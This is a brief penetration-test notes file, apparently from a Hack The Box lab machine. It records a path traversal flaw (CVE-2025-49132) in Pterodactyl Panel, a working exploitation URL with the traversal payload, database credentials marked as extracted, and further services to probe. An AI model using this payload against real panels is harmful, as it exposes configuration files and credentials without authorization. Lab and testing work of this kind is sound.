# CVEs - Unknown Machine (10.129.4.99)

## CVE-2025-49132
- **Affected Service**: Pterodactyl Panel
- **Affected Version**: < 1.11.11 (target runs 1.11.10)
- **CVSS Score**: Critical
- **Description**: Path traversal vulnerability in the `/locales/locale.json` endpoint. Allows unauthenticated attackers to read arbitrary configuration files, including the database configuration which contains cleartext database credentials.
- **Exploit Source**: Exploit-DB 52341, `/usr/share/exploitdb/exploits/multiple/webapps/52341.py`
- **Applicability**: CONFIRMED EXPLOITED - extracted DB creds: pterodactyl:PteraPanel@127.0.0.1:3306/panel
- **Exploitation URL**: `http://panel.pterodactyl.htb/locales/locale.json?locale=../../../pterodactyl&namespace=config/database`

## Additional Potential CVEs to Research
- PHP-PEAR pearcmd.php RCE (if PEAR web interface accessible)
- MariaDB 11.8.3 (check for known vulns)
- OpenSSH 9.6 (check for known vulns)
- nginx 1.21.5 (check for known vulns)
